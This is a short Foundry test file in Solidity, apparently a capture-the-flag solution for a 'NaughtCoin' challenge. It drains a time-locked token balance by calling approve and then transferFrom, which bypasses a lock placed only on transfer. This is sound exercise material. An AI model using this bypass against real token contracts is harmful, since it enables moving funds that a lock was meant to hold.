// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/15_NaughtCoin.sol";

contract AttackerNaughtCoinTest is Test {
    function testNaughtCoin() external {
        vm.prank(address(1));
        NaughtCoin naughtCoin = new NaughtCoin(address(this));

        uint256 bal = naughtCoin.balanceOf(address(this));

        assertGt(bal, 0);
        naughtCoin.approve(address(this), bal);
        naughtCoin.transferFrom(address(this), msg.sender, bal);
        assertEq(naughtCoin.balanceOf(address(this)), 0);
    }
}
